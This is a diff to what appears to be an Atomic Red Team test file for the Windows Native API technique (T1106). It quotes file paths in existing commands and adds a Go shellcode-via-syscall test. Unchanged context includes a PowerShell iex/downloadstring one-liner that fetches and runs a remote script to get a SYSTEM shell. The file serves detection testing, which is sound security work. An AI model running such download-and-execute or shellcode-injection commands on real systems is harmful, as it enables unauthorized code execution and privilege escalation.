@@ -20,13 +20,13 @@ atomic_tests:
   - description: |
       #{source_file} must exist on system.
     prereq_command: |
-      if (Test-Path #{source_file}) {exit 0} else {exit 1}
+      if (Test-Path "#{source_file}") {exit 0} else {exit 1}
     get_prereq_command: |
-      New-Item -Type Directory (split-path #{source_file}) -ErrorAction ignore | Out-Null
+      New-Item -Type Directory (split-path "#{source_file}") -ErrorAction ignore | Out-Null
       Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1106/src/CreateProcess.cs" -OutFile "#{source_file}"
   executor:
     command: |
-      C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /out:"#{output_file}" /target:exe #{source_file}
+      C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /out:"#{output_file}" /target:exe "#{source_file}"
       %tmp%/T1106.exe
     name: command_prompt
 - name: WinPwn - Get SYSTEM shell - Pop System Shell using CreateProcess technique
@@ -56,3 +56,24 @@ atomic_tests:
     command: |-
       iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/NamedPipe/NamedPipeSystem.ps1')
     name: powershell
+- name: Run Shellcode via Syscall in Go
+  auto_generated_guid: ae56083f-28d0-417d-84da-df4242da1f7c
+  description: |
+    Runs shellcode in the current running process via a syscall.
+
+    Steps taken with this technique
+    1. Allocate memory for the shellcode with VirtualAlloc setting the page permissions to Read/Write
+    2. Use the RtlCopyMemory macro to copy the shellcode to the allocated memory space
+    3. Change the memory page permissions to Execute/Read with VirtualProtect
+    4. Use syscall to execute the entrypoint of the shellcode
+
+    - PoC Credit: (https://github.com/Ne0nd0g/go-shellcode#syscall)
+  supported_platforms:
+  - windows
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      $PathToAtomicsFolder\T1106\bin\x64\syscall.exe -debug
+    cleanup_command: |
+       Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue
